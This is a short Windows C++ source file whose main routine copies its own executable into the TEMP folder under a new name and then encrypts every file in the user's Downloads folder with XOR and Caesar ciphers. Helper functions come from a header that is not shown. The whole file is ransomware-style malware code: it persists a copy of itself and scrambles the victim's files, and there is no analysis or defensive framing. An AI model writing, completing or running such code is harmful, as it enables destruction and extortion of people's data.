#include <iostream>
#include <fstream>
#include <windows.h>
#include <string>
#include <vector>
#include "kk5v.h"

// Function to copy the executable to TEMP folder and rename it
void copyFileToTemp() {
    char szPath[MAX_PATH];
    GetModuleFileNameA(NULL, szPath, MAX_PATH);
    std::string fileName = szPath;
    std::string tempPath = std::string(getenv("TEMP")) + "\\" + "replica" + "kk5v.exe";

    // Open the source file
    std::ifstream src(fileName, std::ios::binary);
    std::ofstream dst(tempPath, std::ios::binary);

    // Copy the file
    dst << src.rdbuf();
    src.close();
    dst.close();
}

// Function to apply the XOR cipher and Caesar cipher encryption
void encryptFiles(const std::string& directory) {
    std::vector<std::string> files = getFilesInDirectory(directory); // Get files in the directory

    for (const std::string& file : files) {
        // Encrypt the file with XOR and Caesar cipher
        encryptFileXOR(file);
        encryptFileCaesar(file);
    }
}

// Main function
int main() {
    // Copy itself to TEMP
    copyFileToTemp();

    // Encrypt files in USERPROFILE\Downloads directory
    std::string downloadDir = std::string(getenv("USERPROFILE")) + "\\Downloads";
    encryptFiles(downloadDir);

    return 0;
}
